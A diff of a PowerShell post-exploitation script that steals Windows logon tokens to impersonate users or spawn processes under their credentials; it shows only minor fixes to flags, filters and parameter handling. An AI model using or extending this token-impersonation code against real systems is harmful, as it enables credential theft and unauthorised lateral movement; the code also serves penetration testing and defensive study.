@@ -3,6 +3,8 @@
 <#
 .SYNOPSIS
 
+THIS IS CURRENTLY IN BETA AND SOME FEATURES DONT FULLY WORK!
+
 This script requires Administrator privileges. It can enumerate the Logon Tokens available and use them to create new processes. This allows you to use
 anothers users credentials over the network by creating a process with their logon token. This will work even with Windows 8.1 LSASS protections.
 This functionality is very similar to the incognito tool (with some differences, and different use goals).
@@ -38,7 +40,7 @@ Author: Joe Bialek, Twitter: @JosephBialek
 License: BSD 3-Clause
 Required Dependencies: None
 Optional Dependencies: None
-Version: 0.1
+Version: 0.11
 
 .DESCRIPTION
 
@@ -248,7 +250,7 @@ Github repo: https://github.com/clymb3r/PowerShell
     ###############################
     #Win32Constants
     ###############################
-    $Win32Constants = New-Object System.Object
+    $Win32Constants = New-Object PSObject
     $Win32Constants | Add-Member -Type NoteProperty -Name PROCESS_QUERY_INFORMATION -Value 0x400
     $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_ASSIGN_PRIMARY -Value 0x1
     $Win32Constants | Add-Member -Type NoteProperty -Name TOKEN_DUPLICATE -Value 0x2
@@ -519,7 +521,7 @@ Github repo: https://github.com/clymb3r/PowerShell
             $TokenPrivs = $Win32Constants.TOKEN_ASSIGN_PRIMARY -bor $Win32Constants.TOKEN_DUPLICATE -bor $Win32Constants.TOKEN_IMPERSONATE -bor $Win32Constants.TOKEN_QUERY 
         }
 
-        $ReturnStruct = New-Object System.Object
+        $ReturnStruct = New-Object PSObject
 
         $hProcess = $OpenProcess.Invoke($Win32Constants.PROCESS_QUERY_INFORMATION, $true, [UInt32]$ProcessId)
         $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcess -Value $hProcess
@@ -567,7 +569,7 @@ Github repo: https://github.com/clymb3r/PowerShell
 
         $TokenPrivs = $Win32Constants.TOKEN_ALL_ACCESS
 
-        $RetStruct = New-Object System.Object
+        $RetStruct = New-Object PSObject
         [IntPtr]$hThreadToken = [IntPtr]::Zero
 
         $hThread = $OpenThread.Invoke($Win32Constants.THREAD_ALL_ACCESS, $false, $ThreadId)
@@ -682,7 +684,7 @@ Github repo: https://github.com/clymb3r/PowerShell
                         $DomainBuffer = [IntPtr]::Zero
                     }
 
-                    $ReturnObj = New-Object System.Object
+                    $ReturnObj = New-Object PSObject
                     $ReturnObj | Add-Member -Type NoteProperty -Name Domain -Value $Domain
                     $ReturnObj | Add-Member -Type NoteProperty -Name Username -Value $Username    
                     $ReturnObj | Add-Member -Type NoteProperty -Name hToken -Value $hToken
@@ -802,12 +804,12 @@ Github repo: https://github.com/clymb3r/PowerShell
         foreach ($Token in $AllTokens)
         {
             $Key = $Token.Domain + "\" + $Token.Username
-            if (!$TokenFilter.ContainsKey($Key))
+            if (-not $TokenFilter.ContainsKey($Key))
             {
                 #Filter out network logons and junk Windows accounts. This filter eliminates accounts which won't have creds because
                 #    they are network logons (type 3) or logons for which the creds don't matter like LOCOAL SERVICE, DWM, etc..
                 if ($Token.LogonType -ne 3 -and
-                    $Token.Username -inotmatch "^DWM-1$" -and
+                    $Token.Username -inotmatch "^DWM-\d+$" -and
                     $Token.Username -inotmatch "^LOCAL\sSERVICE$")
                 {
                     $TokenFilter.Add($Key, $Token)
@@ -906,7 +908,7 @@ Github repo: https://github.com/clymb3r/PowerShell
                 $ProcessArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ProcessArgs)
             }
 
-            $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0, $ProcessNamePtr, $ProcessArgsPtr, 0x10, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
+            $Success = $CreateProcessWithTokenW.Invoke($NewHToken, 0x2, $ProcessNamePtr, $ProcessArgsPtr, 0x10, [IntPtr]::Zero, [IntPtr]::Zero, $StartupInfoPtr, $ProcessInfoPtr)
             if ($Success)
             {
                 #Free the handles returned in the ProcessInfo structure
@@ -961,7 +963,7 @@ Github repo: https://github.com/clymb3r/PowerShell
     {
         Param(
             [Parameter(Position=0, Mandatory=$true)]
-            [System.Object[]]
+            [PSObject[]]
             $TokenInfoObjs
         )
 
@@ -1070,11 +1072,11 @@ Github repo: https://github.com/clymb3r/PowerShell
     {
         $OriginalUser = [Environment]::UserName
 
-        if ($RevToSelf)
+        if ($PsCmdlet.ParameterSetName -ieq "RevToSelf")
         {
             Invoke-RevertToSelf -ShowOutput
         }
-        elseif ($CreateProcess -or $ImpersonateUser)
+        elseif ($PsCmdlet.ParameterSetName -ieq "CreateProcess" -or $PsCmdlet.ParameterSetName -ieq "ImpersonateUser")
         {
             $AllTokens = Enum-AllTokens
             
@@ -1111,6 +1113,7 @@ Github repo: https://github.com/clymb3r/PowerShell
             #Use the token for the selected action
             if ($CreateProcess)
             {
+                Invoke-RevertToSelf # todo maybe delete
                 Create-ProcessWithToken -hToken $hToken -ProcessName $ProcessName -ProcessArgs $ProcessArgs
 
                 if ($OriginalUser -ine "SYSTEM")
@@ -1126,7 +1129,7 @@ Github repo: https://github.com/clymb3r/PowerShell
 
             Free-AllTokens -TokenInfoObjs $AllTokens
         }
-        elseif ($WhoAmI)
+        elseif ($PsCmdlet.ParameterSetName -ieq "WhoAmI")
         {
             Write-Output "$([Environment]::UserDomainName)\$([Environment]::UserName)"
         }
@@ -1134,7 +1137,7 @@ Github repo: https://github.com/clymb3r/PowerShell
         {
             $AllTokens = Enum-AllTokens
 
-            if ($ShowAll)
+            if ($PsCmdlet.ParameterSetName -ieq "ShowAll")
             {
                 Write-Output $AllTokens
             }
